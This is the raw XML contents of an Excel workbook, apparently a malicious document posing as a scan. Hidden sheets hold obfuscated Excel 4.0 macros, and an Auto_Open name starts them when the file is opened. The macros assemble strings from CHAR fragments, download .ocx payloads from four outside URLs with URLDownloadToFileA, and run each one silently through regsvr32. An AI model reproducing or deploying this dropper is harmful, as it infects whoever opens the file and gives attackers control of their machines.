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5100926\AppData\Local\Temp\Temp1_SCAN_5258200.zip\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <bookViews>
    <workbookView xWindow="0" yWindow="0" windowWidth="25125" windowHeight="13590"/>
  </bookViews>
  <sheets>
    <sheet name="Sheet" sheetId="1" r:id="rId1"/>
    <sheet name="KBSNTND" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Vv" sheetId="7" state="hidden" r:id="rId3"/>
    <sheet name="ORHINSNR" sheetId="3" state="hidden" r:id="rId4"/>
    <sheet name="THJD" sheetId="4" state="hidden" r:id="rId5"/>
    <sheet name="SGGSBe" sheetId="5" state="hidden" r:id="rId6"/>
    <sheet name="KBRSBTL" sheetId="6" state="hidden" r:id="rId7"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open436465375735346574574532644745">KBRSBTL!$J$1</definedName>
  </definedNames>
  <calcPr calcId="162913"/>
  <fileRecoveryPr repairLoad="1"/>
</workbook>
</file>

<file path=xl/calcChain.xml><?xml version="1.0" encoding="utf-8"?>
<calcChain xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <c r="M3" i="5" l="1"/>
  <c r="O6" i="5"/>
  <c r="D8" i="5"/>
  <c r="H13" i="5"/>
  <c r="R17" i="5"/>
  <c r="P2" i="4"/>
  <c r="C5" i="4"/>
  <c r="J11" i="4"/>
  <c r="D15" i="4"/>
  <c r="B19" i="4"/>
  <c r="R19" i="4"/>
  <c r="H22" i="4"/>
  <c r="L26" i="4"/>
  <c r="L11" i="3"/>
  <c r="D18" i="3"/>
  <c r="S22" i="3"/>
  <c r="G24" i="3"/>
  <c r="I24" i="3"/>
  <c r="H26" i="3"/>
  <c r="J26" i="3"/>
  <c r="O8" i="7"/>
  <c r="R8" i="7"/>
  <c r="J9" i="7"/>
  <c r="D11" i="7"/>
  <c r="S11" i="7"/>
  <c r="K12" i="7"/>
  <c r="E14" i="7"/>
  <c r="Q1" i="2"/>
  <c r="E2" i="2"/>
  <c r="K2" i="2"/>
  <c r="S2" i="2"/>
  <c r="B3" i="2"/>
  <c r="I3" i="2"/>
  <c r="O3" i="2"/>
  <c r="A4" i="2"/>
  <c r="M4" i="2"/>
  <c r="T4" i="2"/>
  <c r="J5" i="2"/>
  <c r="S5" i="2"/>
  <c r="D6" i="2"/>
  <c r="Q6" i="2"/>
  <c r="L7" i="2"/>
  <c r="V7" i="2"/>
  <c r="G8" i="2"/>
  <c r="M8" i="2"/>
  <c r="P8" i="2"/>
  <c r="T9" i="2"/>
  <c r="F10" i="2"/>
  <c r="K10" i="2"/>
  <c r="B11" i="2"/>
  <c r="O11" i="2"/>
  <c r="Q11" i="2"/>
  <c r="H13" i="2"/>
  <c r="L13" i="2"/>
  <c r="S13" i="2"/>
  <c r="E14" i="2"/>
  <c r="N14" i="2"/>
  <c r="P15" i="2"/>
  <c r="C16" i="2"/>
  <c r="M16" i="2"/>
  <c r="T16" i="2"/>
  <c r="R17" i="2"/>
  <c r="O18" i="2"/>
  <c r="F28" i="2"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="29" uniqueCount="29">
  <si>
    <t>X</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>d</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>"</t>
  </si>
  <si>
    <t>:</t>
  </si>
  <si>
    <t>=</t>
  </si>
  <si>
    <t>,</t>
  </si>
  <si>
    <t>\</t>
  </si>
  <si>
    <t>C</t>
  </si>
  <si>
    <t>A</t>
  </si>
  <si>
    <t>.</t>
  </si>
  <si>
    <t>L</t>
  </si>
  <si>
    <t>&amp;</t>
  </si>
  <si>
    <t>(</t>
  </si>
  <si>
    <t>U</t>
  </si>
  <si>
    <t>-</t>
  </si>
  <si>
    <t>)</t>
  </si>
  <si>
    <t>T</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>R</t>
  </si>
  <si>
    <t>E</t>
  </si>
  <si>
    <t>N</t>
  </si>
  <si>
    <t>RETU</t>
  </si>
  <si>
    <t>()</t>
  </si>
  <si>
    <t>RN</t>
  </si>
  <si>
    <t>e</t>
  </si>
  <si>
    <t>","</t>
  </si>
  <si>
    <t>m"&amp;"/u"&amp;"pl"&amp;"oa"&amp;"d/x"&amp;"sV"&amp;"EP"&amp;"r4"&amp;"70"&amp;"8U"&amp;"k/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</si>
</sst>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DF7B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IntlMacrosheet" Target="macrosheets/intlsheet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19050</xdr:rowOff>
    </xdr:from>
    <xdr:to>
      <xdr:col>3</xdr:col>
      <xdr:colOff>1590675</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>276225</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="1072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"/>
          <a:ext cx="6791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J12:J49"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="4.28515625" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="4.28515625" style="1"/>
  </cols>
  <sheetData>
    <row r="12" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J12" s="1" t="b">
        <f>FORMULA(KBSNTND!L24&amp;KBSNTND!L26&amp;KBSNTND!L27&amp;KBSNTND!L28&amp;KBSNTND!L28&amp;ORHINSNR!L11&amp;ORHINSNR!D18&amp;KBSNTND!F10&amp;ORHINSNR!S22&amp;SGGSBe!O6&amp;ORHINSNR!G24&amp;THJD!D15&amp;SGGSBe!D8&amp;THJD!R19,J15)=FORMULA(KBSNTND!L24&amp;KBSNTND!G8&amp;KBSNTND!F4&amp;KBSNTND!G8&amp;KBSNTND!O3&amp;KBSNTND!L30&amp;KBSNTND!F24&amp;KBSNTND!O3&amp;THJD!J11&amp;THJD!C5&amp;KBSNTND!A4&amp;THJD!H22&amp;KBSNTND!A4&amp;THJD!B19&amp;KBSNTND!F10&amp;THJD!L26&amp;THJD!P2&amp;SGGSBe!D8&amp;KBSNTND!F24&amp;KBSNTND!L31,J17)=FORMULA(KBSNTND!L24&amp;KBSNTND!L26&amp;KBSNTND!L27&amp;KBSNTND!L28&amp;KBSNTND!L28&amp;ORHINSNR!L11&amp;ORHINSNR!D18&amp;KBSNTND!F10&amp;ORHINSNR!S22&amp;SGGSBe!O6&amp;ORHINSNR!H26&amp;THJD!D15&amp;SGGSBe!H13&amp;THJD!R19,J19)=FORMULA(KBSNTND!L24&amp;KBSNTND!G8&amp;KBSNTND!F4&amp;KBSNTND!G8&amp;KBSNTND!O3&amp;KBSNTND!L30&amp;KBSNTND!F24&amp;KBSNTND!O3&amp;THJD!J11&amp;THJD!C5&amp;KBSNTND!A4&amp;THJD!H22&amp;KBSNTND!A4&amp;THJD!B19&amp;KBSNTND!F10&amp;THJD!L26&amp;THJD!P2&amp;SGGSBe!H13&amp;KBSNTND!F24&amp;KBSNTND!L31,J21)=FORMULA(KBSNTND!L24&amp;KBSNTND!L26&amp;KBSNTND!L27&amp;KBSNTND!L28&amp;KBSNTND!L28&amp;ORHINSNR!L11&amp;ORHINSNR!D18&amp;KBSNTND!F10&amp;ORHINSNR!S22&amp;SGGSBe!O6&amp;ORHINSNR!I24&amp;THJD!D15&amp;SGGSBe!M3&amp;THJD!R19,J23)=FORMULA(KBSNTND!L24&amp;KBSNTND!G8&amp;KBSNTND!F4&amp;KBSNTND!G8&amp;KBSNTND!O3&amp;KBSNTND!L30&amp;KBSNTND!F24&amp;KBSNTND!O3&amp;THJD!J11&amp;THJD!C5&amp;KBSNTND!A4&amp;THJD!H22&amp;KBSNTND!A4&amp;THJD!B19&amp;KBSNTND!F10&amp;THJD!L26&amp;THJD!P2&amp;SGGSBe!M3&amp;KBSNTND!F24&amp;KBSNTND!L31,J25)=FORMULA(KBSNTND!L24&amp;KBSNTND!L26&amp;KBSNTND!L27&amp;KBSNTND!L28&amp;KBSNTND!L28&amp;ORHINSNR!L11&amp;ORHINSNR!D18&amp;KBSNTND!F10&amp;ORHINSNR!S22&amp;SGGSBe!O6&amp;ORHINSNR!J26&amp;THJD!D15&amp;SGGSBe!R17&amp;THJD!R19,J27)=FORMULA(KBSNTND!L24&amp;KBSNTND!G8&amp;KBSNTND!F4&amp;KBSNTND!G8&amp;KBSNTND!O3&amp;KBSNTND!L30&amp;KBSNTND!F24&amp;KBSNTND!O3&amp;THJD!J11&amp;THJD!C5&amp;KBSNTND!A4&amp;THJD!H22&amp;KBSNTND!A4&amp;THJD!B19&amp;KBSNTND!F10&amp;THJD!L26&amp;THJD!P2&amp;SGGSBe!R17&amp;KBSNTND!F24&amp;KBSNTND!L31,J29)=FORMULA(KBSNTND!L24&amp;KBSNTND!G44&amp;KBSNTND!H46&amp;KBSNTND!J44,J49)</f>
        <v>1</v>
      </c>
    </row>
    <row r="15" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J15" s="1">
        <f>CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://bosny.com/aspnet_client/jBnf4JopKAybRZb7U/","..\peg1.ocx",0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="17" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J17" s="1">
        <f>EXEC("C:\Windows\System32\regsvr32.exe /S ..\peg1.ocx")</f>
        <v>33</v>
      </c>
    </row>
    <row r="19" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J19" s="1">
        <f>CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://aysbody.com/catalog/bwC1Xuouo/","..\peg2.ocx",0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="21" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J21" s="1">
        <f>EXEC("C:\Windows\System32\regsvr32.exe /S ..\peg2.ocx")</f>
        <v>33</v>
      </c>
    </row>
    <row r="23" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J23" s="1">
        <f>CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://cashmailsystem.com"&amp;"/u"&amp;"pl"&amp;"oa"&amp;"d/x"&amp;"sV"&amp;"EP"&amp;"r4"&amp;"70"&amp;"8U"&amp;"k/","..\peg3.ocx",0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="25" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J25" s="1">
        <f>EXEC("C:\Windows\System32\regsvr32.exe /S ..\peg3.ocx")</f>
        <v>33</v>
      </c>
    </row>
    <row r="27" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J27" s="1">
        <f>CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://www.thuybaohuy.com/wp-content/6O4JMYNFBxOXta/","..\peg4.ocx",0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="29" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J29" s="1">
        <f>EXEC("C:\Windows\System32\regsvr32.exe /S ..\peg4.ocx")</f>
        <v>33</v>
      </c>
    </row>
    <row r="49" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J49" s="1" t="b">
        <f>RETURN()</f>
        <v>1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B6" sqref="B6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="26.85546875" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" s="2" customFormat="1" ht="27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"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E15" sqref="E15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="3"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:22" x14ac:dyDescent="0.25">
      <c r="Q1" s="3" t="str">
        <f>CHAR(102/2)</f>
        <v>3</v>
      </c>
    </row>
    <row r="2" spans="1:22" x14ac:dyDescent="0.25">
      <c r="E2" s="3" t="str">
        <f>CHAR(216/2)</f>
        <v>l</v>
      </c>
      <c r="K2" s="3" t="str">
        <f>CHAR(35*2)</f>
        <v>F</v>
      </c>
      <c r="S2" s="3" t="str">
        <f>CHAR(100-35)</f>
        <v>A</v>
      </c>
    </row>
    <row r="3" spans="1:22" x14ac:dyDescent="0.25">
      <c r="B3" s="3" t="str">
        <f>CHAR(236-118)</f>
        <v>v</v>
      </c>
      <c r="I3" s="3" t="str">
        <f>CHAR(238/2)</f>
        <v>w</v>
      </c>
      <c r="O3" s="3" t="str">
        <f>CHAR(134/2)</f>
        <v>C</v>
      </c>
      <c r="U3" s="3">
        <v>5</v>
      </c>
    </row>
    <row r="4" spans="1:22" x14ac:dyDescent="0.25">
      <c r="A4" s="3" t="str">
        <f>CHAR(228/2)</f>
        <v>r</v>
      </c>
      <c r="F4" s="3" t="s">
        <v>0</v>
      </c>
      <c r="M4" s="3" t="str">
        <f>CHAR(148/2)</f>
        <v>J</v>
      </c>
      <c r="Q4" s="3">
        <v>1</v>
      </c>
      <c r="T4" s="3" t="str">
        <f>CHAR(42*2)</f>
        <v>T</v>
      </c>
    </row>
    <row r="5" spans="1:22" x14ac:dyDescent="0.25">
      <c r="J5" s="3" t="str">
        <f>CHAR(52*2)</f>
        <v>h</v>
      </c>
      <c r="S5" s="3" t="str">
        <f>CHAR(100/2)</f>
        <v>2</v>
      </c>
    </row>
    <row r="6" spans="1:22" x14ac:dyDescent="0.25">
      <c r="D6" s="3" t="str">
        <f>CHAR(185-110)</f>
        <v>K</v>
      </c>
      <c r="Q6" s="3" t="str">
        <f>CHAR(220-111)</f>
        <v>m</v>
      </c>
    </row>
    <row r="7" spans="1:22" x14ac:dyDescent="0.25">
      <c r="L7" s="3" t="str">
        <f>CHAR(170/2)</f>
        <v>U</v>
      </c>
      <c r="V7" s="3" t="str">
        <f>CHAR(224/2)</f>
        <v>p</v>
      </c>
    </row>
    <row r="8" spans="1:22" x14ac:dyDescent="0.25">
      <c r="G8" s="3" t="str">
        <f>CHAR(109-40)</f>
        <v>E</v>
      </c>
      <c r="M8" s="3" t="str">
        <f>CHAR(200-100)</f>
        <v>d</v>
      </c>
      <c r="P8" s="3" t="str">
        <f>CHAR(232/2)</f>
        <v>t</v>
      </c>
    </row>
    <row r="9" spans="1:22" x14ac:dyDescent="0.25">
      <c r="T9" s="3" t="str">
        <f>CHAR(194/2)</f>
        <v>a</v>
      </c>
    </row>
    <row r="10" spans="1:22" x14ac:dyDescent="0.25">
      <c r="F10" s="3" t="str">
        <f>CHAR(203-102)</f>
        <v>e</v>
      </c>
      <c r="K10" s="3" t="str">
        <f>CHAR(164-82)</f>
        <v>R</v>
      </c>
    </row>
    <row r="11" spans="1:22" x14ac:dyDescent="0.25">
      <c r="B11" s="3" t="str">
        <f>CHAR(220/2)</f>
        <v>n</v>
      </c>
      <c r="H11" s="3">
        <v>4</v>
      </c>
      <c r="O11" s="3" t="str">
        <f>CHAR(96/2)</f>
        <v>0</v>
      </c>
      <c r="Q11" s="3" t="str">
        <f>CHAR(136/2)</f>
        <v>D</v>
      </c>
    </row>
    <row r="13" spans="1:22" x14ac:dyDescent="0.25">
      <c r="H13" s="3" t="str">
        <f>CHAR(166/2)</f>
        <v>S</v>
      </c>
      <c r="L13" s="3" t="str">
        <f>CHAR(33*2)</f>
        <v>B</v>
      </c>
      <c r="S13" s="3" t="str">
        <f>CHAR(210/2)</f>
        <v>i</v>
      </c>
    </row>
    <row r="14" spans="1:22" x14ac:dyDescent="0.25">
      <c r="E14" s="3" t="str">
        <f>CHAR(240-120)</f>
        <v>x</v>
      </c>
      <c r="N14" s="3" t="str">
        <f>CHAR(217-100)</f>
        <v>u</v>
      </c>
    </row>
    <row r="15" spans="1:22" x14ac:dyDescent="0.25">
      <c r="I15" s="3" t="s">
        <v>1</v>
      </c>
      <c r="P15" s="3" t="str">
        <f>CHAR(202-103)</f>
        <v>c</v>
      </c>
    </row>
    <row r="16" spans="1:22" x14ac:dyDescent="0.25">
      <c r="C16" s="3" t="str">
        <f>CHAR(206-103)</f>
        <v>g</v>
      </c>
      <c r="M16" s="3" t="str">
        <f>CHAR(152-76)</f>
        <v>L</v>
      </c>
      <c r="T16" s="3" t="str">
        <f>CHAR(242/2)</f>
        <v>y</v>
      </c>
    </row>
    <row r="17" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F17" s="3" t="s">
        <v>2</v>
      </c>
      <c r="G17" s="3" t="s">
        <v>3</v>
      </c>
      <c r="R17" s="3" t="str">
        <f>CHAR(212-101)</f>
        <v>o</v>
      </c>
    </row>
    <row r="18" spans="3:21" x14ac:dyDescent="0.25">
      <c r="O18" s="3" t="str">
        <f>CHAR(230/2)</f>
        <v>s</v>
      </c>
    </row>
    <row r="21" spans="3:21" x14ac:dyDescent="0.25">
      <c r="U21" s="3">
        <v>1</v>
      </c>
    </row>
    <row r="24" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F24" s="3" t="s">
        <v>4</v>
      </c>
      <c r="H24" s="3" t="s">
        <v>5</v>
      </c>
      <c r="L24" s="3" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="26" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F26" s="3" t="s">
        <v>7</v>
      </c>
      <c r="H26" s="3" t="s">
        <v>8</v>
      </c>
      <c r="L26" s="3" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="27" spans="3:21" x14ac:dyDescent="0.25">
      <c r="L27" s="3" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="28" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F28" s="3" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="H28" s="3" t="s">
        <v>11</v>
      </c>
      <c r="L28" s="3" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="29" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F29" s="3" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="30" spans="3:21" x14ac:dyDescent="0.25">
      <c r="L30" s="3" t="s">
        <v>14</v>
      </c>
    </row>
    <row r="31" spans="3:21" x14ac:dyDescent="0.25">
      <c r="F31" s="3" t="s">
        <v>15</v>
      </c>
      <c r="H31" s="3" t="s">
        <v>16</v>
      </c>
      <c r="L31" s="3" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="32" spans="3:21" x14ac:dyDescent="0.25">
      <c r="C32" s="3" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="33" spans="3:10" x14ac:dyDescent="0.25">
      <c r="H33" s="3" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="36" spans="3:10" x14ac:dyDescent="0.25">
      <c r="E36" s="3" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="38" spans="3:10" x14ac:dyDescent="0.25">
      <c r="C38" s="3" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="42" spans="3:10" x14ac:dyDescent="0.25">
      <c r="E42" s="3" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="44" spans="3:10" x14ac:dyDescent="0.25">
      <c r="G44" s="3" t="s">
        <v>23</v>
      </c>
      <c r="J44" s="3" t="s">
        <v>24</v>
      </c>
    </row>
    <row r="46" spans="3:10" x14ac:dyDescent="0.25">
      <c r="H46" s="3" t="s">
        <v>25</v>
      </c>
    </row>
    <row r="50" spans="12:12" x14ac:dyDescent="0.25">
      <c r="L50" s="3" t="s">
        <v>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7:S17"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="S11" sqref="S11"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="7" spans="4:19" x14ac:dyDescent="0.25">
      <c r="O7">
        <v>3</v>
      </c>
      <c r="R7">
        <v>4</v>
      </c>
    </row>
    <row r="8" spans="4:19" x14ac:dyDescent="0.25">
      <c r="J8">
        <v>2</v>
      </c>
      <c r="O8" t="str">
        <f>TEXT(":"&amp;"/"&amp;"/ca"&amp;"sh"&amp;"ma"&amp;"il"&amp;"sy"&amp;"st"&amp;"e"&amp;"m.c"&amp;"o",26346)</f>
        <v>://cashmailsystem.co</v>
      </c>
      <c r="R8" t="str">
        <f>TEXT(":"&amp;"/"&amp;"/w"&amp;"ww.t"&amp;"hu"&amp;"yb"&amp;"ao"&amp;"hu"&amp;"y.c"&amp;"o"&amp;"m/w"&amp;"p-c",36435)</f>
        <v>://www.thuybaohuy.com/wp-c</v>
      </c>
    </row>
    <row r="9" spans="4:19" x14ac:dyDescent="0.25">
      <c r="J9" t="str">
        <f>TEXT("s"&amp;":/"&amp;"/ay"&amp;"sb"&amp;"od"&amp;"y.c"&amp;"o"&amp;"m/c"&amp;"a",3637654)</f>
        <v>s://aysbody.com/ca</v>
      </c>
    </row>
    <row r="10" spans="4:19" x14ac:dyDescent="0.25">
      <c r="D10">
        <v>1</v>
      </c>
      <c r="P10">
        <v>3</v>
      </c>
      <c r="S10">
        <v>4</v>
      </c>
    </row>
    <row r="11" spans="4:19" x14ac:dyDescent="0.25">
      <c r="D11" t="str">
        <f>TEXT("s"&amp;":/"&amp;"/bo"&amp;"sn"&amp;"y.c"&amp;"o"&amp;"m/a"&amp;"sp"&amp;"ne"&amp;"t_c"&amp;"l",25352)</f>
        <v>s://bosny.com/aspnet_cl</v>
      </c>
      <c r="K11">
        <v>2</v>
      </c>
      <c r="P11" t="s">
        <v>28</v>
      </c>
      <c r="S11" t="str">
        <f>TEXT("o"&amp;"nt"&amp;"en"&amp;"t/6"&amp;"O4"&amp;"JM"&amp;"YN"&amp;"FB"&amp;"xO"&amp;"Xt"&amp;"a/",353753)</f>
        <v>ontent/6O4JMYNFBxOXta/</v>
      </c>
    </row>
    <row r="12" spans="4:19" x14ac:dyDescent="0.25">
      <c r="K12" t="str">
        <f>TEXT("t"&amp;"al"&amp;"og"&amp;"/bw"&amp;"C1"&amp;"Xu"&amp;"ou"&amp;"o/",53757)</f>
        <v>talog/bwC1Xuouo/</v>
      </c>
    </row>
    <row r="13" spans="4:19" x14ac:dyDescent="0.25">
      <c r="E13">
        <v>1</v>
      </c>
    </row>
    <row r="14" spans="4:19" x14ac:dyDescent="0.25">
      <c r="E14" t="str">
        <f>TEXT("i"&amp;"en"&amp;"t/jB"&amp;"nf4"&amp;"Jo"&amp;"pK"&amp;"Ay"&amp;"bR"&amp;"Zb"&amp;"7U/",3646)</f>
        <v>ient/jBnf4JopKAybRZb7U/</v>
      </c>
    </row>
    <row r="17" spans="7:7" x14ac:dyDescent="0.25">
      <c r="G1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1:S26"/>
  <sheetViews>
    <sheetView topLeftCell="A10" workbookViewId="0">
      <selection activeCell="H26" sqref="H26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="8" max="8" width="68.5703125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="11" spans="12:12" x14ac:dyDescent="0.25">
      <c r="L11" t="str">
        <f>T(KBSNTND!L30&amp;KBSNTND!F24&amp;KBSNTND!N14&amp;KBSNTND!A4&amp;KBSNTND!E2&amp;KBSNTND!Q6)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="18" spans="4:19" x14ac:dyDescent="0.25">
      <c r="D18" t="str">
        <f>T(KBSNTND!R17&amp;KBSNTND!B11&amp;KBSNTND!F24&amp;KBSNTND!F26&amp;KBSNTND!F24&amp;KBSNTND!L7&amp;KBSNTND!K10&amp;KBSNTND!M16&amp;KBSNTND!Q11&amp;KBSNTND!R17&amp;KBSNTND!I3&amp;KBSNTND!B11&amp;KBSNTND!E2&amp;KBSNTND!R17&amp;KBSNTND!T9&amp;KBSNTND!F17&amp;KBSNTND!T4&amp;KBSNTND!R17&amp;KBSNTND!K2&amp;KBSNTND!S13&amp;KBSNTND!E2)</f>
        <v>on","URLDownloadToFil</v>
      </c>
    </row>
    <row r="22" spans="4:19" x14ac:dyDescent="0.25">
      <c r="S22" t="str">
        <f>T(KBSNTND!S2&amp;KBSNTND!F24&amp;KBSNTND!F26&amp;KBSNTND!F24&amp;KBSNTND!M4&amp;KBSNTND!M4&amp;KBSNTND!O3&amp;KBSNTND!O3&amp;KBSNTND!L13&amp;KBSNTND!L13&amp;KBSNTND!F24)</f>
        <v>A","JJCCBB"</v>
      </c>
    </row>
    <row r="24" spans="4:19" x14ac:dyDescent="0.25">
      <c r="G24" t="str">
        <f>T(Vv!D11&amp;Vv!E14&amp;Vv!G17)</f>
        <v>s://bosny.com/aspnet_client/jBnf4JopKAybRZb7U/","</v>
      </c>
      <c r="I24" t="str">
        <f>T(Vv!O8&amp;Vv!P11&amp;Vv!G17)</f>
        <v>://cashmailsystem.com"&amp;"/u"&amp;"pl"&amp;"oa"&amp;"d/x"&amp;"sV"&amp;"EP"&amp;"r4"&amp;"70"&amp;"8U"&amp;"k/","</v>
      </c>
    </row>
    <row r="26" spans="4:19" x14ac:dyDescent="0.25">
      <c r="H26" t="str">
        <f>T(Vv!J9&amp;Vv!K12&amp;Vv!G17)</f>
        <v>s://aysbody.com/catalog/bwC1Xuouo/","</v>
      </c>
      <c r="J26" t="str">
        <f>T(Vv!R8&amp;Vv!S11&amp;Vv!G17)</f>
        <v>://www.thuybaohuy.com/wp-content/6O4JMYNFBxOXta/","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26"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="3:16" x14ac:dyDescent="0.25">
      <c r="P2" s="1" t="str">
        <f>T(KBSNTND!F28&amp;KBSNTND!H28&amp;KBSNTND!H28&amp;KBSNTND!H26)</f>
        <v xml:space="preserve"> ..\</v>
      </c>
    </row>
    <row r="5" spans="3:16" x14ac:dyDescent="0.25">
      <c r="C5" s="1" t="str">
        <f>T("System32\")</f>
        <v>System32\</v>
      </c>
    </row>
    <row r="11" spans="3:16" x14ac:dyDescent="0.25">
      <c r="J11" s="1" t="str">
        <f>T(":\Windows\")</f>
        <v>:\Windows\</v>
      </c>
    </row>
    <row r="15" spans="3:16" x14ac:dyDescent="0.25">
      <c r="D15" s="1" t="str">
        <f>T(KBSNTND!H28&amp;KBSNTND!H28&amp;KBSNTND!H26)</f>
        <v>..\</v>
      </c>
    </row>
    <row r="19" spans="2:18" x14ac:dyDescent="0.25">
      <c r="B19" s="1" t="str">
        <f>T(KBSNTND!Q1&amp;KBSNTND!S5&amp;KBSNTND!H28&amp;KBSNTND!F10&amp;KBSNTND!E14)</f>
        <v>32.ex</v>
      </c>
      <c r="R19" s="1" t="str">
        <f>T(KBSNTND!F24&amp;KBSNTND!F26&amp;KBSNTND!O11&amp;KBSNTND!F26&amp;KBSNTND!O11&amp;KBSNTND!L31)</f>
        <v>",0,0)</v>
      </c>
    </row>
    <row r="22" spans="2:18" x14ac:dyDescent="0.25">
      <c r="H22" s="1" t="str">
        <f>T(KBSNTND!F10&amp;KBSNTND!C16&amp;KBSNTND!O18&amp;KBSNTND!B3)</f>
        <v>egsv</v>
      </c>
    </row>
    <row r="26" spans="2:18" x14ac:dyDescent="0.25">
      <c r="L26" s="1" t="str">
        <f>T(KBSNTND!F28&amp;KBSNTND!H33&amp;KBSNTND!H13)</f>
        <v xml:space="preserve"> /S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R17"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="O6" sqref="O6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="3"/>
  </cols>
  <sheetData>
    <row r="3" spans="4:15" x14ac:dyDescent="0.25">
      <c r="M3" s="3" t="str">
        <f>T(KBSNTND!G17&amp;KBSNTND!F10&amp;KBSNTND!C16&amp;KBSNTND!Q1&amp;KBSNTND!H28&amp;KBSNTND!R17&amp;KBSNTND!P15&amp;KBSNTND!E14)</f>
        <v>peg3.ocx</v>
      </c>
    </row>
    <row r="6" spans="4:15" x14ac:dyDescent="0.25">
      <c r="O6" s="3" t="str">
        <f>T(KBSNTND!F26&amp;KBSNTND!O11&amp;KBSNTND!F26&amp;KBSNTND!F24&amp;KBSNTND!I15&amp;KBSNTND!P8&amp;KBSNTND!P8&amp;KBSNTND!G17)</f>
        <v>,0,"http</v>
      </c>
    </row>
    <row r="8" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D8" s="3" t="str">
        <f>T(KBSNTND!G17&amp;KBSNTND!F10&amp;KBSNTND!C16&amp;KBSNTND!Q4&amp;KBSNTND!H28&amp;KBSNTND!R17&amp;KBSNTND!P15&amp;KBSNTND!E14)</f>
        <v>peg1.ocx</v>
      </c>
    </row>
    <row r="13" spans="4:15" x14ac:dyDescent="0.25">
      <c r="H13" s="3" t="str">
        <f>T(KBSNTND!G17&amp;KBSNTND!F10&amp;KBSNTND!C16&amp;KBSNTND!S5&amp;KBSNTND!H28&amp;KBSNTND!R17&amp;KBSNTND!P15&amp;KBSNTND!E14)</f>
        <v>peg2.ocx</v>
      </c>
    </row>
    <row r="17" spans="18:18" x14ac:dyDescent="0.25">
      <c r="R17" s="3" t="str">
        <f>T(KBSNTND!G17&amp;KBSNTND!F10&amp;KBSNTND!C16&amp;KBSNTND!H11&amp;KBSNTND!H28&amp;KBSNTND!R17&amp;KBSNTND!P15&amp;KBSNTND!E14)</f>
        <v>peg4.ocx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1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="7" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>KBSNTND</vt:lpstr>
      <vt:lpstr>Vv</vt:lpstr>
